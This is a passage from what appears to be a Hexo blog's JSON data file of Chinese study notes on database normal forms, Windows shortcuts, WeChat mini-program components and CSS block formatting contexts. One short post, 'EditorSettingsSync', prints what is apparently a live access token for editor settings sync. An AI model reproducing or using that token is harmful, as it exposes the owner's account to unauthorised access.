教科书上解释为:“<code>实体所具有的某一特性</code>”，由此可见，属性一开始是个<code>逻辑概念</code>，比如说，“性别”是“人”的一个属性。在<code>关系数据库</code>中，属性又是个<code>物理概念</code>，属性可以看作是“<code>表的一列</code>”。</p>\n<p><strong>元组</strong>：表中的一行就是一个元组。</p>\n<p><strong>分量</strong>：<code>元组</code>的某个 <code>属性值</code>。在一个关系数据库中，它是一个<code>操作原子</code>，即关系数据库在做任何操作的时候，属性是“不可分的”。否则就不是关系数据库了。</p>\n<p><strong>码(键)</strong>：表中可以唯一确定一个元组的某个 属性(或者属性组)，如果这样的码有不止一个，那么大家都叫 <code>候选码</code>，我们从候选码中挑一个出来做老大，它就叫<code>主码(主键)</code>。</p>\n<p><strong>全码</strong>：如果一个码包含了所有的属性，这个码就是全码。</p>\n<p><strong>主属性</strong>：一个属性只要在任何一个候选码中出现过，这个属性就是主属性。</p>\n<p><strong>非主属性</strong>：与上面相反，没有在任何候选码中出现过，这个属性就是非主属性。</p>\n<p><strong>外码</strong>：一个属性(或属性组)，它不是码，但是它别的表的码，它就是外码。</p>\n<p><strong>候选码</strong>： 若关系中的某一属性或属性组的值能唯一的标识一个元组，而其任何真子集都不能再标识，则称该属性组为(超级码)候选码。</p>\n<h4 id=\"数据库，部分函数依赖，传递函数依赖，完全函数依赖，三种范式的区别\"><a href=\"#数据库，部分函数依赖，传递函数依赖，完全函数依赖，三种范式的区别\" class=\"headerlink\" title=\"数据库，部分函数依赖，传递函数依赖，完全函数依赖，三种范式的区别\"></a><a href=\"https://blog.csdn.net/rl529014/article/details/48391465\" target=\"_blank\" rel=\"noopener\">数据库，部分函数依赖，传递函数依赖，完全函数依赖，三种范式的区别</a></h4><p><strong>函数依赖</strong>: 设X,Y是关系R的两个属性集合,存在X→Y;则称Y 函数依赖于X。</p>\n<p><strong>部分函数依赖</strong>：设X,Y是关系R的两个属性集合，存在X→Y; 若X’是X的<code>真子集</code>，存在X’→Y，则称Y 部分函数依赖于X。</p>\n<p><strong>完全函数依赖</strong>：设X,Y是关系R的两个属性集合，X’是X的真子集，存在X→Y; X’是X的<code>真子集</code>，但对每一个X’都有X’!→Y，则称Y完全函数依赖于X。(个人理解为 只能通过 X确定 Y，并且每个X’ 都不能确定Y 的关系 就是完全函数依赖)</p>\n<p><strong>传递函数依赖</strong>：设X,Y,Z是关系R中互不相同的属性集合，存在X→Y(Y !→X),Y→Z(Z !→Y)，则称Z传递函数依赖于X。</p>\n<p>假如 Z 函数依赖于 Y，且 Y 函数依赖于 X （『Y 不包含于 X，且 X 不函数依赖于 Y』这个前提），那么我们就称 Z 传递函数依赖于 X ，记作 X T→ Z，如图3。</p>\n<h2 id=\"二、6种范式\"><a href=\"#二、6种范式\" class=\"headerlink\" title=\"二、6种范式\"></a>二、6种范式</h2><p>前面说到，<code>范式越高</code>，数据的<code>冗余</code>度<code>越小</code>。其实<code>没有冗余</code>的数据库设计是<code>可以做到</code>的。但是，<code>没有冗余</code>的数据库<code>未必是最好的</code>数据库，有时为了提高运行效率，就必须降低范式标准，适当保留冗余数据。具体做法是：在概念数据模型设计时遵守第三范式，降低范式标准的工作放到物理数据模型设计时考虑。降低范式就是增加字段，允许冗余。(最典型的就是在一些数据表中不仅存作为外键的user_id,同样存user_name,这样虽然违反数据库范式增加了user_name字段，但是却提高了效率，减少了获取user_id后再去user表中获取user name的操作)</p>\n<p>所以实际中，我们只需要考虑数据库满足第三范式就可以了,下面以最通俗的方式来解释数据库的范式。</p>\n<p><strong>第一范式(1NF)：属性不可分</strong></p>\n<p>(1NF是对属性的原子性约束，要求属性具有原子性，不可再分解)</p>\n<p>不满足第一范式的数据库，不是关系数据库！</p>\n<p><strong>第二范式（2NF）：符合1NF，并且非主属性完全依赖于码。</strong></p>\n<p>第二范式要求非主属性依赖于主关键字。</p>\n<p>（2NF是对记录的惟一性约束，要求记录有惟一标识，即实体的惟一性，更通俗说有主键ID）</p>\n<p><strong>第三范式（3NF）：符合2NF，并且，消除传递依赖。</strong><br>（3NF是对字段冗余性的约束，即任何字段不能由其他字段派生出来，它要求字段没有冗余）</p>\n"},{"title":"Windows/系统快捷键","date":"2018-05-05T01:46:01.000Z","archives":"系统快捷键","_content":"# Windows/系统快捷键\n\n## Win10\n> Win + G  // XBOX录屏软件\n\n> Win + shift + 1~9  // 快速建立新窗口/多窗口\n\n> Win + `\"+\"` // 屏幕放大镜\n\n> Win + Esc  // 关闭屏幕放大镜\n","source":"_posts/Windows/Windows-系统快捷键.md","raw":"---\ntitle: Windows/系统快捷键\ndate: 2018-05-05 09:46:01\ntags: Windows/系统快捷键\narchives: 系统快捷键\ncategories: Windows\n---\n# Windows/系统快捷键\n\n## Win10\n> Win + G  // XBOX录屏软件\n\n> Win + shift + 1~9  // 快速建立新窗口/多窗口\n\n> Win + `\"+\"` // 屏幕放大镜\n\n> Win + Esc  // 关闭屏幕放大镜\n","slug":"Windows/Windows-系统快捷键","published":1,"updated":"2018-05-05T02:16:41.181Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i2al0042b8xj1zisyb5c","content":"<h1 id=\"Windows-系统快捷键\"><a href=\"#Windows-系统快捷键\" class=\"headerlink\" title=\"Windows/系统快捷键\"></a>Windows/系统快捷键</h1><h2 id=\"Win10\"><a href=\"#Win10\" class=\"headerlink\" title=\"Win10\"></a>Win10</h2><blockquote>\n<p>Win + G  // XBOX录屏软件</p>\n<p>Win + shift + 1~9  // 快速建立新窗口/多窗口</p>\n<p>Win + <code>&quot;+&quot;</code> // 屏幕放大镜</p>\n<p>Win + Esc  // 关闭屏幕放大镜</p>\n</blockquote>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"Windows-系统快捷键\"><a href=\"#Windows-系统快捷键\" class=\"headerlink\" title=\"Windows/系统快捷键\"></a>Windows/系统快捷键</h1><h2 id=\"Win10\"><a href=\"#Win10\" class=\"headerlink\" title=\"Win10\"></a>Win10</h2><blockquote>\n<p>Win + G  // XBOX录屏软件</p>\n<p>Win + shift + 1~9  // 快速建立新窗口/多窗口</p>\n<p>Win + <code>&quot;+&quot;</code> // 屏幕放大镜</p>\n<p>Win + Esc  // 关闭屏幕放大镜</p>\n</blockquote>\n"},{"title":"WxApp学习笔记1","date":"2018-06-06T04:16:14.000Z","_content":"## 一、简介\n+ 前端\n  + PC\n    + WEB\n    + OS-Native(Windows/Unix[Linux/MaxOS])\n  + MB\n    + WAP\n    + hybrid\n    + OS-Native(Android/ios)\n    + WXApp(微信小程序)\n+ 后台\n  + Server\n    + Java\n    + PHP\n    + NodeJS\n    + Python\n    + Golang\n    + Ruby\n    + ...\n  + DataBase\n    + SQL\n      + MySQL\n      + MsSQL\n      + ...\n    + NoSQL\n      + MongoDB\n      + Redis\n      + ...\n\n## 二、小程序开发工具下载安装\n  百度小程序开发下载工具，默认安装即可\n\n## 三、组件\n### **scroll-view**\n| 属性名 | 类型 | 默认值 | 说明 |\n| :-: | :-: | :-: | :-: |\n| scroll-x | Boolean | false | 横向滚动 |\n| scroll-y | Boolean | false | 纵向滚动 |\n| upper-threshold | Number | 50 | 距`顶部/左边`??px, 触发 scrolltoupper 事件 |\n| lower-threshold | Number | 50 | 距`底部/右边`??px, 触发 scrolltolower 事件 |\n| scroll-top | Number |  | 控制横向滚动条位置 |\n| scroll-left | Number |  | 控制纵向滚动条位置 |\n| scroll-into-view | String |  | 值为子元素ID,表现为: 元素对齐滚动区域顶部 |\n| bindscrolltoupper | EventHandle |  | 滚动到顶部/左边,触发`scrolltoupper` 事件 |\n| bindscrolltolower | EventHandle |  | 滚动到底部/右边,触发`scrolltolower` 事件 |\n| bindscroll | EventHandle |  | 滚动过程中触发`scroll` 事件, event.detail = {scrollLeft/Top/Width/Height、detailX/Y} |\n\n\n### **swiper**\n子元素只有\\<swiper-item/>组件,其余节点会被自动删除。\n\n\\<swiper-item/>只可放置在\\<swiper/>组件中，宽高自动100%。\n\n| 属性名 | 类型 | 默认值 | 说明 |\n| :-: | :-: | :-: | :-: |\n| indicator | Boolean | false | 控制显示面板指示点 |\n| autoplay | Boolean | false | 自动切换 |\n| current | Number | 0 | 切换到指定 index |\n| interval | Number | 5000 | 自动切换时间间隔 |\n| duration | Number | 1000 | 过渡动画时长 |\n| bindchange | EventHandle |  | current 改变触发`change` 事件, event.detail = {current: current} |\n","source":"_posts/WXApp/WxApp学习笔记1.md","raw":"---\ntitle: WxApp学习笔记1\ndate: 2018-06-06 12:16:14\ntags: WX小程序\ncategories: WxApp\n---\n## 一、简介\n+ 前端\n  + PC\n    + WEB\n    + OS-Native(Windows/Unix[Linux/MaxOS])\n  + MB\n    + WAP\n    + hybrid\n    + OS-Native(Android/ios)\n    + WXApp(微信小程序)\n+ 后台\n  + Server\n    + Java\n    + PHP\n    + NodeJS\n    + Python\n    + Golang\n    + Ruby\n    + ...\n  + DataBase\n    + SQL\n      + MySQL\n      + MsSQL\n      + ...\n    + NoSQL\n      + MongoDB\n      + Redis\n      + ...\n\n## 二、小程序开发工具下载安装\n  百度小程序开发下载工具，默认安装即可\n\n## 三、组件\n### **scroll-view**\n| 属性名 | 类型 | 默认值 | 说明 |\n| :-: | :-: | :-: | :-: |\n| scroll-x | Boolean | false | 横向滚动 |\n| scroll-y | Boolean | false | 纵向滚动 |\n| upper-threshold | Number | 50 | 距`顶部/左边`??px, 触发 scrolltoupper 事件 |\n| lower-threshold | Number | 50 | 距`底部/右边`??px, 触发 scrolltolower 事件 |\n| scroll-top | Number |  | 控制横向滚动条位置 |\n| scroll-left | Number |  | 控制纵向滚动条位置 |\n| scroll-into-view | String |  | 值为子元素ID,表现为: 元素对齐滚动区域顶部 |\n| bindscrolltoupper | EventHandle |  | 滚动到顶部/左边,触发`scrolltoupper` 事件 |\n| bindscrolltolower | EventHandle |  | 滚动到底部/右边,触发`scrolltolower` 事件 |\n| bindscroll | EventHandle |  | 滚动过程中触发`scroll` 事件, event.detail = {scrollLeft/Top/Width/Height、detailX/Y} |\n\n\n### **swiper**\n子元素只有\\<swiper-item/>组件,其余节点会被自动删除。\n\n\\<swiper-item/>只可放置在\\<swiper/>组件中，宽高自动100%。\n\n| 属性名 | 类型 | 默认值 | 说明 |\n| :-: | :-: | :-: | :-: |\n| indicator | Boolean | false | 控制显示面板指示点 |\n| autoplay | Boolean | false | 自动切换 |\n| current | Number | 0 | 切换到指定 index |\n| interval | Number | 5000 | 自动切换时间间隔 |\n| duration | Number | 1000 | 过渡动画时长 |\n| bindchange | EventHandle |  | current 改变触发`change` 事件, event.detail = {current: current} |\n","slug":"WXApp/WxApp学习笔记1","published":1,"updated":"2018-06-12T04:47:48.646Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i2an0044b8xj4tlcektl","content":"<h2 id=\"一、简介\"><a href=\"#一、简介\" class=\"headerlink\" title=\"一、简介\"></a>一、简介</h2><ul>\n<li>前端<ul>\n<li>PC<ul>\n<li>WEB</li>\n<li>OS-Native(Windows/Unix[Linux/MaxOS])</li>\n</ul>\n</li>\n<li>MB<ul>\n<li>WAP</li>\n<li>hybrid</li>\n<li>OS-Native(Android/ios)</li>\n<li>WXApp(微信小程序)</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>后台<ul>\n<li>Server<ul>\n<li>Java</li>\n<li>PHP</li>\n<li>NodeJS</li>\n<li>Python</li>\n<li>Golang</li>\n<li>Ruby</li>\n<li>…</li>\n</ul>\n</li>\n<li>DataBase<ul>\n<li>SQL<ul>\n<li>MySQL</li>\n<li>MsSQL</li>\n<li>…</li>\n</ul>\n</li>\n<li>NoSQL<ul>\n<li>MongoDB</li>\n<li>Redis</li>\n<li>…</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"二、小程序开发工具下载安装\"><a href=\"#二、小程序开发工具下载安装\" class=\"headerlink\" title=\"二、小程序开发工具下载安装\"></a>二、小程序开发工具下载安装</h2><p>  百度小程序开发下载工具，默认安装即可</p>\n<h2 id=\"三、组件\"><a href=\"#三、组件\" class=\"headerlink\" title=\"三、组件\"></a>三、组件</h2><h3 id=\"scroll-view\"><a href=\"#scroll-view\" class=\"headerlink\" title=\"scroll-view\"></a><strong>scroll-view</strong></h3><table>\n<thead>\n<tr>\n<th style=\"text-align:center\">属性名</th>\n<th style=\"text-align:center\">类型</th>\n<th style=\"text-align:center\">默认值</th>\n<th style=\"text-align:center\">说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">scroll-x</td>\n<td style=\"text-align:center\">Boolean</td>\n<td style=\"text-align:center\">false</td>\n<td style=\"text-align:center\">横向滚动</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">scroll-y</td>\n<td style=\"text-align:center\">Boolean</td>\n<td style=\"text-align:center\">false</td>\n<td style=\"text-align:center\">纵向滚动</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">upper-threshold</td>\n<td style=\"text-align:center\">Number</td>\n<td style=\"text-align:center\">50</td>\n<td style=\"text-align:center\">距<code>顶部/左边</code>??px, 触发 scrolltoupper 事件</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">lower-threshold</td>\n<td style=\"text-align:center\">Number</td>\n<td style=\"text-align:center\">50</td>\n<td style=\"text-align:center\">距<code>底部/右边</code>??px, 触发 scrolltolower 事件</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">scroll-top</td>\n<td style=\"text-align:center\">Number</td>\n<td style=\"text-align:center\"></td>\n<td style=\"text-align:center\">控制横向滚动条位置</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">scroll-left</td>\n<td style=\"text-align:center\">Number</td>\n<td style=\"text-align:center\"></td>\n<td style=\"text-align:center\">控制纵向滚动条位置</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">scroll-into-view</td>\n<td style=\"text-align:center\">String</td>\n<td style=\"text-align:center\"></td>\n<td style=\"text-align:center\">值为子元素ID,表现为: 元素对齐滚动区域顶部</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">bindscrolltoupper</td>\n<td style=\"text-align:center\">EventHandle</td>\n<td style=\"text-align:center\"></td>\n<td style=\"text-align:center\">滚动到顶部/左边,触发<code>scrolltoupper</code> 事件</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">bindscrolltolower</td>\n<td style=\"text-align:center\">EventHandle</td>\n<td style=\"text-align:center\"></td>\n<td style=\"text-align:center\">滚动到底部/右边,触发<code>scrolltolower</code> 事件</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">bindscroll</td>\n<td style=\"text-align:center\">EventHandle</td>\n<td style=\"text-align:center\"></td>\n<td style=\"text-align:center\">滚动过程中触发<code>scroll</code> 事件, event.detail = {scrollLeft/Top/Width/Height、detailX/Y}</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"swiper\"><a href=\"#swiper\" class=\"headerlink\" title=\"swiper\"></a><strong>swiper</strong></h3><p>子元素只有\\<swiper-item>组件,其余节点会被自动删除。</swiper-item></p>\n<p>\\<swiper-item>只可放置在\\<swiper>组件中，宽高自动100%。</swiper></swiper-item></p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">属性名</th>\n<th style=\"text-align:center\">类型</th>\n<th style=\"text-align:center\">默认值</th>\n<th style=\"text-align:center\">说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">indicator</td>\n<td style=\"text-align:center\">Boolean</td>\n<td style=\"text-align:center\">false</td>\n<td style=\"text-align:center\">控制显示面板指示点</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">autoplay</td>\n<td style=\"text-align:center\">Boolean</td>\n<td style=\"text-align:center\">false</td>\n<td style=\"text-align:center\">自动切换</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">current</td>\n<td style=\"text-align:center\">Number</td>\n<td style=\"text-align:center\">0</td>\n<td style=\"text-align:center\">切换到指定 index</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">interval</td>\n<td style=\"text-align:center\">Number</td>\n<td style=\"text-align:center\">5000</td>\n<td style=\"text-align:center\">自动切换时间间隔</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">duration</td>\n<td style=\"text-align:center\">Number</td>\n<td style=\"text-align:center\">1000</td>\n<td style=\"text-align:center\">过渡动画时长</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">bindchange</td>\n<td style=\"text-align:center\">EventHandle</td>\n<td style=\"text-align:center\"></td>\n<td style=\"text-align:center\">current 改变触发<code>change</code> 事件, event.detail = {current: current}</td>\n</tr>\n</tbody>\n</table>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"一、简介\"><a href=\"#一、简介\" class=\"headerlink\" title=\"一、简介\"></a>一、简介</h2><ul>\n<li>前端<ul>\n<li>PC<ul>\n<li>WEB</li>\n<li>OS-Native(Windows/Unix[Linux/MaxOS])</li>\n</ul>\n</li>\n<li>MB<ul>\n<li>WAP</li>\n<li>hybrid</li>\n<li>OS-Native(Android/ios)</li>\n<li>WXApp(微信小程序)</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>后台<ul>\n<li>Server<ul>\n<li>Java</li>\n<li>PHP</li>\n<li>NodeJS</li>\n<li>Python</li>\n<li>Golang</li>\n<li>Ruby</li>\n<li>…</li>\n</ul>\n</li>\n<li>DataBase<ul>\n<li>SQL<ul>\n<li>MySQL</li>\n<li>MsSQL</li>\n<li>…</li>\n</ul>\n</li>\n<li>NoSQL<ul>\n<li>MongoDB</li>\n<li>Redis</li>\n<li>…</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"二、小程序开发工具下载安装\"><a href=\"#二、小程序开发工具下载安装\" class=\"headerlink\" title=\"二、小程序开发工具下载安装\"></a>二、小程序开发工具下载安装</h2><p>  百度小程序开发下载工具，默认安装即可</p>\n<h2 id=\"三、组件\"><a href=\"#三、组件\" class=\"headerlink\" title=\"三、组件\"></a>三、组件</h2><h3 id=\"scroll-view\"><a href=\"#scroll-view\" class=\"headerlink\" title=\"scroll-view\"></a><strong>scroll-view</strong></h3><table>\n<thead>\n<tr>\n<th style=\"text-align:center\">属性名</th>\n<th style=\"text-align:center\">类型</th>\n<th style=\"text-align:center\">默认值</th>\n<th style=\"text-align:center\">说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">scroll-x</td>\n<td style=\"text-align:center\">Boolean</td>\n<td style=\"text-align:center\">false</td>\n<td style=\"text-align:center\">横向滚动</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">scroll-y</td>\n<td style=\"text-align:center\">Boolean</td>\n<td style=\"text-align:center\">false</td>\n<td style=\"text-align:center\">纵向滚动</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">upper-threshold</td>\n<td style=\"text-align:center\">Number</td>\n<td style=\"text-align:center\">50</td>\n<td style=\"text-align:center\">距<code>顶部/左边</code>??px, 触发 scrolltoupper 事件</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">lower-threshold</td>\n<td style=\"text-align:center\">Number</td>\n<td style=\"text-align:center\">50</td>\n<td style=\"text-align:center\">距<code>底部/右边</code>??px, 触发 scrolltolower 事件</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">scroll-top</td>\n<td style=\"text-align:center\">Number</td>\n<td style=\"text-align:center\"></td>\n<td style=\"text-align:center\">控制横向滚动条位置</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">scroll-left</td>\n<td style=\"text-align:center\">Number</td>\n<td style=\"text-align:center\"></td>\n<td style=\"text-align:center\">控制纵向滚动条位置</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">scroll-into-view</td>\n<td style=\"text-align:center\">String</td>\n<td style=\"text-align:center\"></td>\n<td style=\"text-align:center\">值为子元素ID,表现为: 元素对齐滚动区域顶部</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">bindscrolltoupper</td>\n<td style=\"text-align:center\">EventHandle</td>\n<td style=\"text-align:center\"></td>\n<td style=\"text-align:center\">滚动到顶部/左边,触发<code>scrolltoupper</code> 事件</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">bindscrolltolower</td>\n<td style=\"text-align:center\">EventHandle</td>\n<td style=\"text-align:center\"></td>\n<td style=\"text-align:center\">滚动到底部/右边,触发<code>scrolltolower</code> 事件</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">bindscroll</td>\n<td style=\"text-align:center\">EventHandle</td>\n<td style=\"text-align:center\"></td>\n<td style=\"text-align:center\">滚动过程中触发<code>scroll</code> 事件, event.detail = {scrollLeft/Top/Width/Height、detailX/Y}</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"swiper\"><a href=\"#swiper\" class=\"headerlink\" title=\"swiper\"></a><strong>swiper</strong></h3><p>子元素只有\\<swiper-item>组件,其余节点会被自动删除。</swiper-item></p>\n<p>\\<swiper-item>只可放置在\\<swiper>组件中，宽高自动100%。</swiper></swiper-item></p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">属性名</th>\n<th style=\"text-align:center\">类型</th>\n<th style=\"text-align:center\">默认值</th>\n<th style=\"text-align:center\">说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">indicator</td>\n<td style=\"text-align:center\">Boolean</td>\n<td style=\"text-align:center\">false</td>\n<td style=\"text-align:center\">控制显示面板指示点</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">autoplay</td>\n<td style=\"text-align:center\">Boolean</td>\n<td style=\"text-align:center\">false</td>\n<td style=\"text-align:center\">自动切换</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">current</td>\n<td style=\"text-align:center\">Number</td>\n<td style=\"text-align:center\">0</td>\n<td style=\"text-align:center\">切换到指定 index</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">interval</td>\n<td style=\"text-align:center\">Number</td>\n<td style=\"text-align:center\">5000</td>\n<td style=\"text-align:center\">自动切换时间间隔</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">duration</td>\n<td style=\"text-align:center\">Number</td>\n<td style=\"text-align:center\">1000</td>\n<td style=\"text-align:center\">过渡动画时长</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">bindchange</td>\n<td style=\"text-align:center\">EventHandle</td>\n<td style=\"text-align:center\"></td>\n<td style=\"text-align:center\">current 改变触发<code>change</code> 事件, event.detail = {current: current}</td>\n</tr>\n</tbody>\n</table>\n"},{"title":"EditorSettingsSync","date":"2018-05-23T06:31:10.000Z","_content":"生成新token：c49d7c88a2236d998b043830034a10d1b00ca5df","source":"_posts/Editor/EditorSettingsSync.md","raw":"---\ntitle: EditorSettingsSync\ndate: 2018-05-23 14:31:10\ntags: 编辑器设置同步\ncategories: VSCode\n---\n生成新token：c49d7c88a2236d998b043830034a10d1b00ca5df","slug":"Editor/EditorSettingsSync","published":1,"updated":"2018-05-23T06:33:44.890Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i2ao0049b8xjtq1eklfh","content":"<p>生成新token：c49d7c88a2236d998b043830034a10d1b00ca5df</p>\n","site":{"data":{}},"excerpt":"","more":"<p>生成新token：c49d7c88a2236d998b043830034a10d1b00ca5df</p>\n"},{"title":"CSS-潜藏着的BFC","date":"2015-04-16T07:54:04.000Z","archives":"样式表","_content":" ### 一、什么是BFC(Block Formatting Context)\n   写`CSS`样式时，对一个`元素`设置css,我们首先要知道这个元素是`块级元素`还是`行内元素`，而`BFC`就是用来**`格式化块级盒子`**的。<br>\n  `Formatting Context`：指页面中一个渲染区域，并且拥有一套渲染规则，它决定了其子元素如何定位，以及与其他元素的相互关系和作用。<br>\n  `BFC定义`：块级格式化上下文  它是指一个独立的块级渲染区域，只有`Block-level Box`参与，该区域拥有一套渲染规则来约束块级盒子的布局，且与区域外部无关。<br>\n \n ### 二、BFC的生成\n  说到BFC是一块渲染区域，那么这块渲染区域到底在哪里呢，具体大小又是多少？这些都是由生成BFC的元素来决定的。<br>\n  满足下列CSS声明`之一`的元素便会生成BFC：\n   + 1.根元素或其它包含它的元素\n   + 2.float的值不为none；\n   + 3.overflow的值不为visible；\n   + 4.position的值不为static；\n   + 5.display的值为inline-block、table-cell、table-caption；\n   + 6.flex boxes (元素的display: flex或inline-flex)；\n   \n   注：也有人认为`display: table`能生成BFC，我认为最主要原因是table会默认生成一个匿名的table-cell，正是这个匿名的table-cell生成了BFC。\n\n ### 三、BFC的布局规则\n  菜鸟教程待续\n  ","source":"_posts/FrontEnd/HTML+CSS/CSS-潜藏着的BFC.md","raw":"---\ntitle: CSS-潜藏着的BFC\ndate: 2015-04-16 15:54:04\ntags: BFC\narchives: 样式表\ncategories: CSS\n---\n ### 一、什么是BFC(Block Formatting Context)\n   写`CSS`样式时，对一个`元素`设置css,我们首先要知道这个元素是`块级元素`还是`行内元素`，而`BFC`就是用来**`格式化块级盒子`**的。<br>\n  `Formatting Context`：指页面中一个渲染区域，并且拥有一套渲染规则，它决定了其子元素如何定位，以及与其他元素的相互关系和作用。<br>\n  `BFC定义`：块级格式化上下文  它是指一个独立的块级渲染区域，只有`Block-level Box`参与，该区域拥有一套渲染规则来约束块级盒子的布局，且与区域外部无关。<br>\n \n ### 二、BFC的生成\n  说到BFC是一块渲染区域，那么这块渲染区域到底在哪里呢，具体大小又是多少？这些都是由生成BFC的元素来决定的。<br>\n  满足下列CSS声明`之一`的元素便会生成BFC：\n   + 1.根元素或其它包含它的元素\n   + 2.float的值不为none；\n   + 3.overflow的值不为visible；\n   + 4.position的值不为static；\n   + 5.display的值为inline-block、table-cell、table-caption；\n   + 6.flex boxes (元素的display: flex或inline-flex)；\n   \n   注：也有人认为`display: table`能生成BFC，我认为最主要原因是table会默认生成一个匿名的table-cell，正是这个匿名的table-cell生成了BFC。\n\n ### 三、BFC的布局规则\n  菜鸟教程待续\n  ","slug":"FrontEnd/HTML+CSS/CSS-潜藏着的BFC","published":1,"updated":"2018-05-05T01:28:36.609Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i2bg005eb8xj5zcw9jfw","content":"<h3 id=\"一、什么是BFC-Block-Formatting-Context\"><a href=\"#一、什么是BFC-Block-Formatting-Context\" class=\"headerlink\" title=\"一、什么是BFC(Block Formatting Context)\"></a>一、什么是BFC(Block Formatting Context)</h3><p>   写<code>CSS</code>样式时，对一个<code>元素</code>设置css,我们首先要知道这个元素是<code>块级元素</code>还是<code>行内元素</code>，而<code>BFC</code>就是用来<strong><code>格式化块级盒子</code></strong>的。<br><br>  <code>Formatting Context</code>：指页面中一个渲染区域，并且拥有一套渲染规则，它决定了其子元素如何定位，以及与其他元素的相互关系和作用。<br><br>  <code>BFC定义</code>：块级格式化上下文  它是指一个独立的块级渲染区域，只有<code>Block-level Box</code>参与，该区域拥有一套渲染规则来约束块级盒子的布局，且与区域外部无关。<br></p>\n<h3 id=\"二、BFC的生成\"><a href=\"#二、BFC的生成\" class=\"headerlink\" title=\"二、BFC的生成\"></a>二、BFC的生成</h3><p>  说到BFC是一块渲染区域，那么这块渲染区域到底在哪里呢，具体大小又是多少？这些都是由生成BFC的元素来决定的。<br><br>  满足下列CSS声明<code>之一</code>的元素便会生成BFC：</p>\n<ul>\n<li>1.根元素或其它包含它的元素</li>\n<li>2.float的值不为none；</li>\n<li>3.overflow的值不为visible；</li>\n<li>4.position的值不为static；</li>\n<li>5.display的值为inline-block、table-cell、table-caption；</li>\n<li><p>6.flex boxes (元素的display: flex或inline-flex)；</p>\n<p>注：也有人认为<code>display: table</code>能生成BFC，我认为最主要原因是table会默认生成一个匿名的table-cell，正是这个匿名的table-cell生成了BFC。</p>\n<h3 id=\"三、BFC的布局规则\"><a href=\"#三、BFC的布局规则\" class=\"headerlink\" title=\"三、BFC的布局规则\"></a>三、BFC的布局规则</h3><p>菜鸟教程待续</p>\n</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"一、什么是BFC-Block-Formatting-Context\"><a href=\"#一、什么是BFC-Block-Formatting-Context\" class=\"headerlink\" title=\"一、什么是BFC(Block Formatting Context)\"></a>一、什么是BFC(Block Formatting Context)</h3><p>   写<code>CSS</code>样式时，对一个<code>元素</code>设置css,我们首先要知道这个元素是<code>块级元素</code>还是<code>行内元素</code>，而<code>BFC</code>就是用来<strong><code>格式化块级盒子</code></strong>的。<br><br>  <code>Formatting Context</code>：指页面中一个渲染区域，并且拥有一套渲染规则，它决定了其子元素如何定位，以及与其他元素的相互关系和作用。<br><br>  <code>BFC定义</code>：块级格式化上下文  它是指一个独立的块级渲染区域，只有<code>Block-level Box</code>参与，该区域拥有一套渲染规则来约束块级盒子的布局，且与区域外部无关。<br></p>\n<h3 id=\"二、BFC的生成\"><a href=\"#二、BFC的生成\" class=\"headerlink\" title=\"二、BFC的生成\"></a>二、BFC的生成</h3><p>  说到BFC是一块渲染区域，那么这块渲染区域到底在哪里呢，具体大小又是多少？这些都是由生成BFC的元素来决定的。<br><br>  满足下列CSS声明<code>之一</code>的元素便会生成BFC：</p>\n<ul>\n<li>1.根元素或其它包含它的元素</li>\n<li>2.float的值不为none；</li>\n<li>3.overflow的值不为visible；</li>\n<li>4.position的值不为static；</li>\n<li>5.display的值为inline-block、table-cell、table-caption；</li>\n<li><p>6.flex boxes (元素的display: flex或inline-flex)；</p>\n<p>注：也有人认为<code>display: table</code>能生成BFC，我认为最主要原因是table会默认生成一个匿名的table-cell，正是这个匿名的table-cell生成了BFC。</p>\n<h3 id=\"三、BFC的布局规则\"><a href=\"#三、BFC的布局规则\" class=\"headerlink\" title=\"三、BFC的布局规则\"></a>三、BFC的布局规则</h3><p>菜鸟教程待续</p>\n</li>\n</ul>\n"},{"title":"Bootstrap响应式布局","date":"2018-05-11T08:24:17.000Z","_content":"## 